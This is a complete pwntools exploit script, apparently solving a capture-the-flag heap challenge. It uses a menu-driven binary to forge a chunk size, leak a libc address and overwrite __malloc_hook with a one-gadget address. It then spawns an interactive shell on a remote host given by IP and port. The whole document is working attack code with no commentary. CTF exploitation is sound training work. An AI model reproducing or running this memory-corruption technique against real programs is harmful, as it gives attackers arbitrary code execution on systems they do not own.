from pwn import*
context.log_level ='DEBUG'
def menu(ch):
	p.sendlineafter('>> ',str(ch))
def new():
	menu(1)
def edit(index,name):
	menu(2)
	p.sendlineafter('idx >>',str(index))
	p.sendafter('movie name >> ',name)
def large():
	menu(3)
def show():
	menu(4)
def leave(say):
	menu(5)
	p.sendafter('QAQ\n',say)
p = process('./main')
p = remote('123.56.170.202',52114)
libc =ELF('./libc-2.27.so')
new()
edit(0,p64(0) + p64(0xD41))
large()
new()
show()
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook']  -0x10 - 1632
log.info('LIBC:\t' + hex(libc_base))
malloc_hook = libc_base + libc.sym['__malloc_hook']
rce = libc_base + 0x10A45C
leave(p64(malloc_hook - 0x60))
edit(8,p64(rce))
new()
p.interactive()

